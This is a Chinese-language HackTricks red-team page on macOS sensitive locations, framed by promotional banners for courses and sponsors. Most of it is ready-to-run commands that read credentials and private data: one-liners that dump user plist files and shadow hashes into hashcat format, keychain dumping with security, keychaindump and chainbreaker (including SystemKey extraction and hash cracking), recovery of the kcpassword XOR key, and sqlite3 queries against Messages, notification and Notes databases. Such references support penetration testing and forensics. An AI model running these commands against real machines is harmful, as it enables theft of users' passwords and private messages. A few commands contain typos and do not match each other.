# macOS敏感位置

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 密码

### 阴影密码

阴影密码与用户配置一起存储在位于**`/var/db/dslocal/nodes/Default/users/`**中的plist文件中。\
以下一行命令可用于转储**有关用户的所有信息**（包括哈希信息）：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**像这样的脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)或[**这样的脚本**](https://github.com/octomagon/davegrohl.git)可用于将哈希转换为**hashcat** **格式**。

另一个一行命令，将以 `-m 7100`（macOS PBKDF2-SHA512）的hashcat格式转储所有非服务账户的凭证：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
### 密钥链转储

请注意，使用 security 二进制文件来**转储解密的密码**时，会出现多个提示要求用户允许此操作。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
根据这个评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) 看起来这些工具在 Big Sur 上不再起作用了。
{% endhint %}

### Keychaindump 概述

一个名为 **keychaindump** 的工具已经被开发出来，用于从 macOS 钥匙串中提取密码，但在像 Big Sur 这样的较新 macOS 版本上面临限制，正如在[讨论](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)中所指出的。使用 **keychaindump** 需要攻击者获得访问权限并提升至 **root** 权限。该工具利用了钥匙串在用户登录时默认解锁的事实，以方便应用程序访问它，而无需反复要求用户输入密码。然而，如果用户选择在每次使用后锁定他们的钥匙串，**keychaindump** 就会失效。

**Keychaindump** 的操作是通过针对一个名为 **securityd** 的特定进程进行的，苹果公司描述它为授权和加密操作的守护程序，对于访问钥匙串至关重要。提取过程涉及识别从用户登录密码派生的一个 **主密钥**。这个密钥对于读取钥匙串文件至关重要。为了定位 **主密钥**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，查找在标记为 `MALLOC_TINY` 的区域内的潜在密钥。以下命令用于检查这些内存位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
在确定潜在主密钥后，**keychaindump** 会通过堆中搜索特定模式（`0x0000000000000018`），该模式表明可能是主密钥的候选项。需要进一步步骤，包括解混淆，才能利用此密钥，如 **keychaindump** 源代码中所述。专注于此领域的分析人员应注意，解密钥匙链的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令如下：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)可以以取证方式从OSX钥匙串中提取以下类型的信息：

- 经过哈希处理的钥匙串密码，适用于使用[hashcat](https://hashcat.net/hashcat/)或[John the Ripper](https://www.openwall.com/john/)进行破解
- 互联网密码
- 通用密码
- 私钥
- 公钥
- X509证书
- 安全笔记
- Appleshare密码

通过钥匙串解锁密码、使用[volafox](https://github.com/n0fate/volafox)或[volatility](https://github.com/volatilityfoundation/volatility)获得的主密钥，或者解锁文件（如SystemKey），Chainbreaker还将提供明文密码。

如果没有这些解锁钥匙串的方法，Chainbreaker将显示所有其他可用信息。

#### **转储钥匙串密钥**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### 使用SystemKey转储钥匙串密钥（包括密码）
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **转储钥匙串密钥（带密码）破解哈希**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用内存转储来转储钥匙串密钥（带密码）**

[按照这些步骤](..#dumping-memory-with-osxpmem)执行**内存转储**。
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用用户密码转储钥匙串密钥（包括密码）**

如果您知道用户的密码，您可以使用它来**转储并解密属于用户的钥匙串**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword**文件是一个文件，其中保存着**用户的登录密码**，但仅当系统所有者已**启用自动登录**时。因此，用户将自动登录，而无需输入密码（这并不安全）。

密码存储在文件**`/etc/kcpassword`**中，使用密钥**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**进行异或运算。如果用户的密码长度超过密钥，密钥将被重复使用。\
这使得密码相当容易被恢复，例如使用[**这样的脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)。 

## 数据库中的有趣信息

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

您可以在 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` 中找到通知数据。

大部分有趣的信息将会在 **blob** 中。因此，您需要 **提取** 该内容并将其转换为 **易读** 的格式，或者使用 **`strings`**。要访问它，您可以执行：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### 注意事项

用户的**笔记**可以在`~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`中找到

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
